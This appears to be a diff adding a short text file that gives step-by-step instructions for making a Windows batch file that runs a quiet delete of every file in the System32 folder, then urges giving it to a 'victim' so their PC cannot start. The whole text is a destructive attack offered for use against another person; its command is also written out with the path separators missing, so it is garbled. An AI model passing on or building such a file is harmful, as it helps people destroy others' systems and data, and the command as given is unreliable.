@@ -1,0 +1,10 @@
+Delete System 32 Folder
+Open Notepad
+
+Write / copy the below command there:
+
+” del c:WINDOWSsystem32*.*/q “ without quote
+
+and save as ” anything.bat”
+
+Done. If You Give this file to your victim his SYSTEM 32 Folder will be deleted. Without which a Windows Pc can’t be started.
